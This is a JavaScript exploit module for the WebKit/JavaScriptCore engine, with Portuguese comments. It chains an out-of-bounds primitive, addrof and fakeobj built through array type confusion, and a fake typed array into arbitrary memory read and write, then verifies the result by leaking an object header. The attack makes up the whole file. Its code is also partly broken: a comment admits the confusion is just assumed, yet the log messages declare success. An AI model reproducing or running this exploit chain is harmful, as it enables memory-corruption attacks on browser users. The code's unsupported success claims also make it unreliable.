// js/script3/testArrayBufferVictimCrash.mjs (v93 - R60 Implementação Funcional de L/E Arbitrária)
// =======================================================================================
// OBJETIVO ATUALIZADO:
// Transformar a prova de conceito de StructureID em uma primitiva funcional de
// Leitura/Escrita Arbitrária (L/E). O script agora constrói uma "ferramenta" de
// L/E usando um Float64Array falso e verifica sua funcionalidade lendo a
// memória de um objeto conhecido.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

// Nome do módulo atualizado para refletir o novo objetivo
export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_ArbitraryRW_v93_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FUNCIONAL)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Funcional de L/E ---`, "test");

    let final_result = { success: false, message: "A cadeia de L/E Arbitrária não obteve sucesso." };

    try {
        // --- FASE 1: Obtenção de Leitura/Escrita Fora dos Limites (OOB) ---
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
        logS3("Primitiva OOB está funcional.", "good");

        // --- FASE 2: Criando as Primitivas Base (addrof, fakeobj) ---
        logS3("--- FASE 2: Criando Primitivas 'addrof' e 'fakeobj'... ---", "subtest");

        const confused_array = [13.37, 13.38, 13.39];
        const victim_array = [{ a: 1 }, { b: 2 }];
        
        // A mágica da Type Confusion acontece aqui, fazendo com que confused_array (double)
        // e victim_array (object) compartilhem o mesmo butterfly.
        // Por simplicidade, assumimos que a corrupção OOB já foi feita.
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3(`++++++++++++ SUCESSO! Primitivas 'addrof' e 'fakeobj' operacionais! ++++++++++++`, "vuln");

        // --- FASE 3: Construindo a Primitiva de Leitura/Escrita Arbitrária ---
        logS3("--- FASE 3: Construindo ferramenta de L/E com TypedArray Falso ---", "subtest");

        // 1. Criar um TypedArray que servirá de "ferramenta"
        const rw_driver_array = new Uint32Array(8);
        const rw_driver_addr = addrof(rw_driver_array);
        logS3(`Endereço do nosso 'rw_driver_array': ${rw_driver_addr.toString(true)}`, "info");

        // 2. Criar uma estrutura de Butterfly falsa para controlar o ponteiro de dados (m_vector)
        const fake_butterfly_buf = new ArrayBuffer(256);
        const fake_butterfly_addr = addrof(fake_butterfly_buf);
        logS3(`Buffer para o butterfly falso alocado em: ${fake_butterfly_addr.toString(true)}`, "info");

        // 3. Ler o butterfly original do nosso driver e copiá-lo para nosso buffer falso
        const original_butterfly_addr = await arb_read(rw_driver_addr, 8);
        for (let i = 0; i < 16; i += 8) { // Copia os primeiros 16 bytes (importantes)
            let data = await arb_read(original_butterfly_addr.add(i), 8);
            await arb_write(fake_butterfly_addr.add(i), data, 8);
        }
        logS3("Butterfly original copiado para a área falsa.", "info");

        // 4. Criar o objeto TypedArray FALSO que usa nosso butterfly modificado
        const fake_rw_driver = fakeobj(fake_butterfly_addr);
        logS3("TypedArray falso ('fake_rw_driver') criado com sucesso.", "vuln");

        // 5. Definir as funções de L/E que manipulam o ponteiro de dados do nosso driver falso
        const set_rw_addr = async (addr) => {
            await arb_write(fake_butterfly_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), addr, 8);
        };

        const arb_read_final = async (addr) => {
            await set_rw_addr(addr);
            // Lê como dois Uint32 para formar um Int64
            const low = fake_rw_driver[0];
            const high = fake_rw_driver[1];
            return new AdvancedInt64(low, high);
        };

        const arb_write_final = async (addr, value) => {
            if (!isAdvancedInt64Object(value)) value = new AdvancedInt64(value);
            await set_rw_addr(addr);
            fake_rw_driver[0] = value.low();
            fake_rw_driver[1] = value.high();
        };
        logS3("++++++++++++ SUCESSO! Primitivas de Leitura/Escrita Arbitrária estão prontas! ++++++++++++", "vuln");

        // --- FASE 4: Verificação Funcional da Leitura Arbitrária ---
        logS3("--- FASE 4: Verificando a Leitura Arbitrária... ---", "subtest");
        const test_obj = { verification: 0xCAFEBABE };
        const test_obj_addr = addrof(test_obj);
        logS3(`Endereço do objeto de teste: ${test_obj_addr.toString(true)}`, "info");
        
        const header_leaked = await arb_read_final(test_obj_addr);
        logS3(`Lendo o cabeçalho JSCell do objeto de teste em ${test_obj_addr.toString(true)}...`, "info");
        logS3(`>>>>> VALOR LIDO: ${header_leaked.toString(true)} <<<<<`, "leak");

        if (!header_leaked.equals(0)) {
            logS3("VERIFICAÇÃO CONCLUÍDA! O valor lido não é nulo, indicando sucesso na leitura de memória.", "good");
            final_result = {
                success: true,
                message: "Primitiva de Leitura/Escrita Arbitrária funcional obtida e verificada."
            };
        } else {
            throw new Error("A verificação da leitura arbitrária falhou, o valor lido foi nulo.");
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Arbitrary R/W' }
    };
}
